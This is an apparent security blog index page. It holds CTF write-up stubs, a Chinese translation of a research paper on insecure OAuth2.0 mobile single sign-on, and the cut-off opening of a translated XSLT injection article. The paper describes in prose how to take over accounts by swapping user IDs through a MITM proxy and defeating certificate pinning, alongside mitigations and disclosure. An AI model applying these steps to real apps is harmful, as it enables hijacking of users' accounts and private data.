<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="OTEx911, security, web" />










<meta name="description" content="Me. a lazy person">
<meta property="og:type" content="website">
<meta property="og:title" content="Security blog">
<meta property="og:url" content="/page/3/index.html">
<meta property="og:site_name" content="Security blog">
<meta property="og:description" content="Me. a lazy person">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Security blog">
<meta name="twitter:description" content="Me. a lazy person">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="/page/3/"/>





  <title>Security blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Security blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="/2017-11-22-Write-up-LCTF2017-Daily-Bonus/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ꭰ">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Security blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017-11-22-Write-up-LCTF2017-Daily-Bonus/" itemprop="url">Write-up LCTF2017 Daily Bonus</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-22T22:08:27+08:00">
                2017-11-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index">
                    <span itemprop="name">CTF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>In Lctf 2017, there is a simple daily bonus. Here is the <a href="http://211.159.161.162/test.php" target="_blank" rel="external">link</a>.</p>
<p>You can find the write-up <a href="https://github.com/LCTF/LCTF2017/blob/master/src/web/%E7%AD%BE%E5%88%B0%E9%A2%98/web%E7%AD%BE%E5%88%B0%E9%A2%98.md" target="_blank" rel="external">here</a>.<br></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017-11-22-Write-up-LCTF2017-Daily-Bonus/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="/Write-Up LCTF萌萌哒报名系统/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ꭰ">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Security blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/Write-Up LCTF萌萌哒报名系统/" itemprop="url">Write-Up LCTF萌萌哒报名系统</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-21T12:12:27+08:00">
                2017-11-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index">
                    <span itemprop="name">CTF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>题目大概是这样的：</p>
<blockquote>
<p>天依花了一整天的时间用IDE开发了一个报名系统，现在她睡着了，难道你们不想做点什么嘛XD?</p>
<p><a href="http://123.206.120.239/" target="_blank" rel="external">http://123.206.120.239/</a></p>
</blockquote>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/Write-Up LCTF萌萌哒报名系统/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="/2017-11-07-Signing-Into-Billion-Mobile-Apps-Effortlessly-With-OAuth20/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ꭰ">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Security blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017-11-07-Signing-Into-Billion-Mobile-Apps-Effortlessly-With-OAuth20/" itemprop="url">【译】通过OAuth2.0可轻松登录数百万手机应用账号</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-07T12:16:27+08:00">
                2017-11-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Translation/" itemprop="url" rel="index">
                    <span itemprop="name">Translation</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h5 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h5><p>主流的身份提供商（IdP）使用OAuth2.0协议来支持单点登录服务。由于此协议最初设计用于满足第三方网站的授权需求，所以在使用OAuth来支持移动应用程序（app）身份验证时，研究人员已经发现了很多的缺陷。据我们所知，之前包括BlackHat USA’16 [3]，CCS’14 [2]和ACSAC’15 [5]提到的所有攻击都需要与受害者进行交互。例如通过恶意应用程序网络窃听等。但，我们发现了第三方app开发人员不合理的使用OAuth导致的一种影响甚广的新型攻击手法，攻击者可以远程利用该攻击，悄无声息的登录受害者的app帐户。为了证明该漏洞的普遍性和严重影响，我们编写了一个exp来检测在美国和中国排名前600的android应用，这些应用都使用了顶级IdP（即Facebook ，Google或新浪）提供的基于OAuth2.0的身份验证服务。结果令人震惊：这些应用程序平均有41.21％容易受到新的攻击。我们已经向受影响的IdP汇报了我们的发现，并收到了他们不同形式的确认/奖励。</p>
<p>###1. 介绍</p>
<p>由于第三方网站采用的基于OAuth2.0的单点登录（SSO）服务广受用户喜爱，最近，许多主流身份提供商（IdP）（如Facebook，Google和Sina）已经将OAuth2.0协议进行了调整，以在其社交媒体平台上支持第三方app的SSO。但由于移动应用程序SSO服务的端到端系统设置和操作环境的差异，原来的OAuth2.0协议不够用了。这一点尤其体现在OAuth2.0标准没有定义关键的安全要求和协议细节用来管理SSO过程中第三方（客户端）移动应用程序与其对应的后端服务器之间的交互。因此，各个IdP厂商基于OAuth2.0的应用程序编程接口（API）开发了不同的扩展用来以支持自己平台上的第三方移动应用程序的SSO服务。不幸的是，第三方移动应用程序开发人员无法完全理解IdP提供的文档，同时文档上也并未清晰的记录了可能的安全问题和API使用说明。更糟的是，第三方应用程序开发人员缺乏SSO-API的安全使用指南规范。</p>
<p><img src="/2017-11-07-Signing-Into-Billion-Mobile-Apps-Effortlessly-With-OAuth20/billion_mobile_app/compare.jpg" alt=""></p>
<p>由于上述的问题，我们进一步对使用了顶级IdP服务的第三方移动应用程序进行了测试，发现了一种影响非常广的基于OAuth2.0的SSO服务的不安全实现。这个问题的本质非常普通，仅仅是因为第三方应用的服务器在接受来自客户端app的授权信息不需经过认证，反过来看，这个漏洞其实是依赖于IdP客户移动app发送的信息被篡改所导致的。根据这个新发现的漏洞，我们写了exp，攻击者可以通过OAuth2.0 1毫不费力地登录受害者的移动应用程序帐户，而无需欺骗或与受害者进行交互，例如通过恶意应用程序或网络窃听等等。就目前来说我们的攻击是基于Android平台进行展示的，但攻击手法本身是平台无关的：只要使用了基于OAuth2.0的SSO服务的app，iOS或Android用户都会受到影响。</p>
<p>###2. 背景<br>第三方移动应用的SSO服务细节涉及到四个部分</p>
<ul>
<li>a. 第三方移动应用程序的后端服务器（app Server）</li>
<li>b. IdP的后端服务器（IdP Server）</li>
<li><p>c. 第三方移动应用（App）</p>
</li>
<li><p>d. IdP的移动应用（IdP App）</p>
</li>
</ul>
<p>OAuth的最终目标是让IdP服务器（IdP Server）向app Server发出身份证明，比如access token。通过access token，app Server可以获取到由IdP服务器管理的用户信息，并进一步根据该信息识别用户并授权登录。</p>
<p>####2.1 移动平台上的OAuth 2.0协议流程<br>图1描述了OAuth协议在网站和移动平台上实现的流程。为简单起见，我们首先介绍移动端OAuth实现的协议流程，然后指出与Web站点SSO服务的差异。请注意，由于OAuth不是为手机app设计的，所以RFC和IdP不会为第三方移动应用程序开发人员提供完整的调用流程图。然而，有研究员针对移动端的OAuth安全方面投入了大量的精力[2,3,5,6]，一个被认为是安全的实施方案如下：</p>
<ol>
<li>用户访问app，并尝试通过IdP进行登录。app通过手机操作系统（Android）提供的安全通道将应用信息（如包名，签名和请求的权限等）发送给IdP的客户端。</li>
<li>通过调用低级系统API，IdP客户端（IdP app）可以验证app的应用信息。如果信息无误，那么IdP客户端（IdP app）会向IdP服务器（IdP Server）发送授权请求。</li>
<li>IdP Server收到请求后，会比较来自IdP客户端（IdP app）的授权请求的信息和由第三方移动应用开发者预先注册的信息。如果相同，则IdP服务器（IdP Server）将通过自己的IdP客户端（IdP App）向第三方手机客户端（app）发出access token（AT）和可选的用户信息。</li>
<li>IdP app通过安全通道将access token（AT）返回给app（第三方客户端应用程序）。</li>
<li>第三方客户端应用程序（app）将AT发送到其后端服务器（app Server）。</li>
<li>第三方后端服务器（app Server）调用由IdP提供的重要安全SSO-API来调试access token。</li>
<li>在验证access token的有效性之后，IdP服务器（IdP Server）会向第三方应用服务器（app Server）发送授权信息，同时指明access token发给哪个app。</li>
<li>只有在授权信息正确的情况下，第三方应用服务器（app Server）才能通过access token获取用户数据。</li>
<li>IdP服务器（IdP Server）返回与access token关联的用户信息。</li>
<li>通过用户信息，第三方应用程序服务器（app Server）可以识别用户并授权登录。</li>
</ol>
<p>####2.2 OpenID连接协议<br>由于OAuth2.0最初是为授权而设计的，为了适应认证需求，这就涉及了多次高延迟的请求，即图1（b）的步骤6到步骤9。为了更好地支持使用OAuth2.0进行身份验证（即减少请求次数），像Google和Facebook这样的IdP开发了OpenID Connect（OIDC）协议[4]和拓展。具体而言，IdP服务器需要对用户信息进行数字签名。如图2所示，签名的用户信息以及原始的access token，随后会被发送到app Server（第三方移动应用程序的后端服务器）。由于签名不能被攻击者篡改/伪造，app Server现在可以通过签名直接识别用户。换句话说，app Server可以立即从签名中提取用户信息，而不需要进行高延迟的API调用。</p>
<p><img src="/2017-11-07-Signing-Into-Billion-Mobile-Apps-Effortlessly-With-OAuth20/billion_mobile_app/openID_connect.png" alt=""></p>
<p>####2.3 不同于网站OAuth实现中的差异<br>从图1所示的协议实现流程图去看，网站和移动端的差异看起来似乎很简单，但实际上正是因为这种简单的不同，导致重要的安全结论并促使OAuth在移动平台上实现的复杂化。可以看到在网站使用OAuth过程中，有三个部分在交互：</p>
<p>（i）第三方web服务器（Client Server）</p>
<p>（ii）IdP的后端服务器（IdP Server）</p>
<p>（iii）终端用户的浏览器（Browser），要求能够支持第三方网站OAuth2.0的SSO。</p>
<p>而之前聊到过的移动端SSO交互过程，却涉及到了4个部分（a、b、c、d）。首先，（c）和（d）都在用户设备上运行，并且可能被篡改。其次，OAuth2.0协议标准并未涉及到（a）和（c）以及（c）和（d）之间的交互和安全问题。第三，在同一用户设备上可能同时存在（c）和（d），第三方移动应用程序开发人员可能会忍不住直接在（c）和（d）之间进行认证交换（恰好与（a）和（b）之间的直接验证相反，就像OAuth2.0标准中定义的（i）和（ii）之间的直接验证交换一样）。再看一个例子，不同于web服务供应商，IdP供应商要求移动应用程序开发人员在OAuth中使用与IdP特定业务逻辑（即授权代码流与隐式流）紧密相关的授权流程，即授权码流程vs无授权码流程（参考文章第二段第二句话<a href="https://labs.hybris.com/2012/06/05/oauth2-the-implicit-flow-aka-as-the-client-side-flow/" target="_blank" rel="external">implicit flow</a>）。此外，典型的移动应用程序的客户端负责更多的消息交换，相反，在第三方网站（及其相应的web服务）的情况下，这些消息是由后端服务器管理。</p>
<p><img src="/2017-11-07-Signing-Into-Billion-Mobile-Apps-Effortlessly-With-OAuth20/billion_mobile_app/client-side-app.png" alt=""></p>
<p>###3. 不同的错误实现方式<br>尽管平台之间差异巨大，但IdP没有提供明确的开发手册来降低OAuth用于移动端可能发生的隐患。所以，第三方移动应用程序开发人员早就犯了各种各样的错误，比如下面这些：</p>
<ol>
<li>如图3（a）所示，当IdP服务器会返回用户信息和OAuthaccess token（例如，用户ID /电子邮件地址）时，许多第三方应用的后端服务器根据收到的用户信息来授权登录，而不验证收到的用户信息是否真的绑定到已发布的OAuth access token。</li>
<li>图3（b）显示了Facebook和Google采用OpenID Connect协议的另一种情况。在这种情况下，IdP需要对用户信息进行数字签名，以便第三方应用的后端服务器可以通过签名验证来对用户进行鉴别。但是，某些第三方应用程序根本不验证此签名，只从签名中提取用户ID，然后不验证ID就将其作为身份证明。</li>
<li>还有些第三方移动应用程序直接从其正在运行的移动设备获取用户信息，直接忽视IdP接收到的OAuth token。（例如，图4(a)所示的IdP服务器提供API，应用通过调用获取用户信息或图4(b)所示设备上有个账户系统存储了用户Google账户信息，可以用来支持SSO服务）。移动应用程序仅将用户标识符作为身份证明发送到其后端服务器。如果没有access token，第三方后端服务器无法验证返回的用户标识符是否绑定了OAuth access token。</li>
</ol>
<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h3><p>因为第三方应用程序开发人员的不规范开发，攻击者可以利用受害者信息登录到存在问题的app，这一切只需要下面这些步骤：</p>
<ol>
<li><p>如图5所示，攻击者在自己的移动设备上启用了ssl的MITM代理（比如mitm-proxy），监控往来的网络流量。</p>
</li>
<li><p>攻击者在自己的移动设备上安装了易受攻击的第三方应用程序。</p>
</li>
<li><p>攻击者通过自己的IdP用户密码，用OAuth登录了易受攻击的移动应用程序。</p>
</li>
<li><p>在步骤3触发的OAuth消息交换过程中，攻击者通过ssl的MITM代理将受害者的用户标识替换为自己的用户标识（IdP或电子邮件地址中的用户标识）。受害者的用户ID是可公开获得的信息（信息来源于受害者公开网页，比如G+和新浪），一般也易于猜测（前提是使用电子邮件地址作为用户名的情况下）。虽然自2014年5月以来Facebook已经开始为每个第三方应用程序发布独立用户ID，但为了向后兼容，Facebook仍然使用公共用户标识来识别第三方应用程序的早期使用者。所以，只要用户在2014年5月之前通过OAuth登录过应用程序，那么即使用最新版本应用程序，仍容易受到攻击。</p>
</li>
<li><p>由于第三方后端服务器直接使用客户端应用程序返回的用户身份证明来标识app用户，因此攻击者可以用受害者的身份登录app，并且在大多数情况下拥有完整的权限访问第三方app服务器管理的受害者敏感信息。<br><img src="/2017-11-07-Signing-Into-Billion-Mobile-Apps-Effortlessly-With-OAuth20/billion_mobile_app/exploit.png" alt=""></p>
</li>
</ol>
<p>除了受SSL / HTTPS保护外，应对第三方移动应用程序的客户端与其后端服务器之间的消息交换进行加密或签名。否则的话，篡改IdP服务器返回的用户标识信息是很容易的。</p>
<p>在IdP客户端应用程序（例如Facebook的应用程序）应用证书锁定的情况下，如果攻击者通过MIMT代理篡改了IdP服务器发送给其客户端应用程序的消息，那该消息不会被接受。那攻击者该如何继续攻击？这儿有一种解决思路，通过卸载IdP客户端应用程序，以便IdP SDK（通常是由OAuth2.0第三方移动应用程序广泛使用）将自动降级，然后通过内置webview浏览器进行OAuth身份验证。对于常见的内置浏览器来说，webview不支持特定IdP的证书锁定。所以，攻击者又能继续篡改消息了。</p>
<p>除了IdP不支持基于webview的OAuth授权情况，还有一些其他的情况。对于这些情况下的IdP来说，攻击者可以使用现成的工具，如SSLUnpinning（如果他们使用原生的Android框架来实现证书锁定），或对IdP客户端应用程序进行逆向来达到手动删除证书锁定的目的（前提是他们使用了cutomized方法）。为了解释这种方法的可行性，我们已成功地在Facebook的app上进行了poc验证，通过手动禁用其证书锁定功能，以便我们通过ssl-enabled-MITM代理为app提供假的用户标识信息。</p>
<p>###5. 现实的惨状<br>我们研究了由三家顶级IdP（即新浪，Facebook和Google）提供的基于OAuth2.0的API，这三家IdP支持全球许多第三方移动应用的SSO服务。如表1所示，这些IdP的注册用户数量从8亿以上到超过25亿。由于支持SSO服务的中国app越来越多，所以我们选择了使用了新浪服务的Top200移动应用程序，另外选择了Top400使用了Google和Facebook服务的移动应用程序。接着我们识别出使用了多个IdP的SSO服务的应用程序，最后使用基于OAuth2.0开发的exp进行测试。结果令人担忧：平均有41.21％的被测移动应用容易受到新的攻击。表2列出了目前为止识别出的易受攻击app中的一部分：这张不完整的列表已经包含两个排名前五的旅行计划app，一个受欢迎的旅馆预订应用程序，一个为情侣/合作伙伴设计的顶级私人聊天应用程序，一个排名前5的约会应用程序，两个顶级的个人金融应用程序，以及其他流行的视频或网上购物应用程序，这里仅列举几例。请注意，这张不完整列表所包含的流行app，总下载量已经超过24亿次。根据Janrain [1]最近的调查，以51％的SSO用户采用率进行保守估计的话，截至撰写本文时，有超过10亿的不同类型的移动应用账号容易受本文所讲述的攻击。</p>
<p><img src="/2017-11-07-Signing-Into-Billion-Mobile-Apps-Effortlessly-With-OAuth20/billion_mobile_app/table-one.png" alt=""></p>
<p><img src="/2017-11-07-Signing-Into-Billion-Mobile-Apps-Effortlessly-With-OAuth20/billion_mobile_app/table-two.png" alt=""></p>
<p>攻击者通过exp登录受害者手机应用账号，并且大多数情况下他们是拥有完整的权限，能够访问受害者的隐私，尽管这些信息由被黑app的服务器管理。单纯是针对表2中列出的易受攻击的应用程序，我们可以通过漏洞获取大量极其敏感的个人信息：包括详细的旅行行程，个人/亲密通信档案，家庭/私人照片，个人财务记录以及受害者的观看或购物历史。对于某些特殊的app来说，攻击者甚至可以随意操作与受害者账户相关联的线上货币。</p>
<p>###6.  建议<br>我们的研究已经展示了这个问题的危害性，对于第三方开发来说在实现或使用基于OAuth2.0的服务时应采取如下措施进行补救：</p>
<ol>
<li>IdP应该提供基于OAuth2.0的SSO API更清晰、更侧重安全性的使用准则。</li>
<li>app的后端服务器不应该信任任何信息，即使信息被app或IdP的app签了名。最好只相信来自IdP服务器的信息。</li>
</ol>
<ol>
<li><p>IdP不应依赖全球用户标识符来进行第三方应用程序认证/授权，而应根据每个移动应用程序发布私人用户标识符。事实上，自2014年5月以来，Facebook已经采用了这种做法。但是，Facebook仍然坚持在2014年5月之前用户开始使用移动应用程序的全球用户标识符。因此，对于易受攻击app的老用户来说，攻击仍存在。</p>
</li>
<li><p>IdP应对第三方移动应用程序进行更加全面的安全测试，特别是通过OAuth2.0或其他类似协议（如OpenID Connect（OIDC）协议）实施单点登录服务这块。</p>
</li>
</ol>
<p>###7. 结论<br>本文中，我们已经确定了一个以前未知的漏洞，攻击者无需交互就能利用这个漏洞劫持受害者的移动应用账户。我们已经检查了美国Top200的app和中国Android app情况，当然这些app都是使用了三家顶级IdP的OAuth2.0授权服务。同时我们展示了这些流行应用程序在多大程度上会受到这种新漏洞的攻击。我们的发现表明，各方迫切需要重新审视他们的SSO实施并据此采取补救。</p>
<p>###8. 负责任的披露<br>于二零一六年四月，我们将研究结果报告予所有受影响的正在研究的IdPs。他们都承认安全问题，并承诺帮助通知受影响的第三方应用程序开发人员。特别是，新浪已经向所有第三方发出了具体的通知</p>
<p>9个应用开发者在其平台上告知他们这个问题。该公司还授予我们最大数量的奖励积分允许他们的错误奖金计划。它也相应地为第三方开发者更新了其编程指南的单点登录部分。 Google已经通过他们的Google安全名人堂确认我们的发现，并表示他们将修改第三方应用开发者的相应文档。 Facebook已经通知我们，他们正在寻找一种方法，让他们的应用程序开发人员意识到这个问题。</p>
<p>###致谢<br>这项研究得到了香港创新科技委员会（项目编号：ITS / 216/15）和国家自然科学基金资助项目（编号：61572415）的部分支持。</p>
<p>###引用<br>[1] “Social login continues strong adoption,” 2014. [Online]. Available:</p>
<p><a href="http://janrain.com/blog/social-login-continues-strong-adoption/" target="_blank" rel="external">http://janrain.com/blog/social-login-continues-strong-adoption/</a></p>
<p>[2] E. Y. Chen, Y. Pei, S. Chen, Y. Tian, R. Kotcher, and P. Tague, “OAuth demystiﬁed for mobile application developers,” in Proceedings of the 2014 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2014.</p>
<p>[3] C. Eric, P. Tague, R. Kotcher, S. Chen, Y. Tian, and Y. Pei, “1000 ways to die in mobile OAuth,” in BlackHat USA, 2016.</p>
<p>[4] N. Sakimura, J. Bradley, M. Jones, B. de Medeiros, and C. Mortimore, “OpenID Connect core 1.0,” The OpenID Foundation, p. S3, 2014.</p>
<p>[5] H. Wang, Y. Zhang, J. Li, H. Liu, W. Yang, B. Li, and D. Gu, “Vulnerability assessment of OAuth implementations in Android applications,” in Proceedings of the 31st Annual Computer Security Applications Conference. ACM, 2015.</p>
<p>[6] Q. Ye, G. Bai, K. Wang, and J. S. Dong, “Formal analysis of a Single Sign-On protocol implementation for Android,” in 20th International Conference on Engineering of Complex Computer Systems, ICECCS 2015, 2015.</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="/2017-10-09-XSLT-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ꭰ">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Security blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017-10-09-XSLT-attack/" itemprop="url">【译】XSLT服务端注入攻击</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-09T23:29:27+08:00">
                2017-10-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Translation/" itemprop="url" rel="index">
                    <span itemprop="name">Translation</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>XSLT漏洞对受影响的应用程序可能造成严重后果，通常的后果是导致远程执行代码。网络上公开exp的XSLT远程代码执行漏洞的例子有这么几个：CVE-2012-5357（影响.Net Ektron CMS）、CVE-2012-1592（影响Apache Struts 2.0）、CVE-2005-3757（影响Google Search Appliance）。</p>
<p><em>从上面的例子可以看出，XSLT漏洞已经存在了很长时间，尽管它们相对于其他类似的漏洞（如XML注入）不常见，但我们经常在安全性评估项目中能遇到它们。尽管如此，但该漏洞和利用技术并不为人所知。</em></p>
<p><em>本文中，我们将演示一系列XSLT攻击去展示以不安全的方式使用该技术的风险。</em></p>
<p><em>接着会阐述如何执行远程代码、从远程系统窃取数据、网络扫描以及从受害者内网获取资源。</em></p>
<p><em>我们还可以提供一个存在漏洞的.Net应用程序，并提供有关如何降低这些攻击风险的建议。</em></p>
<h2 id="什么是XSLT"><a href="#什么是XSLT" class="headerlink" title="什么是XSLT"></a>什么是XSLT</h2><p>XSL是一种将XML文档进行转换的语言，XSLT代表XSL转换，转换本身就是XML文档。</p>
<p>转换的结果可能是一个不同的XML文档或者其他类型的文档（比如HTML文档、CSV文件或者纯文本）。</p>
<p>XSLT常见用途是传输不同应用生成的文件数据和作为模版引擎。许多企业型应用程序广泛使用XSLT。比如，多租户开票应用程序可以允许客户端使用XSLT大量定制其发票。客户可以根据具体需要更改发票中显示的信息及其格式。</p>
<p>其他常见的应用：</p>
<ul>
<li>报表功能</li>
<li>不同格式的数据导出</li>
<li>打印</li>
<li>邮件</li>
</ul>
<p>在描述这类攻击前，让我们通过一个实际例子来看看转换是如何进行的。</p>
<p>首先是下面这样的XML文件，包含了水果名和相关描述的列表：</p>
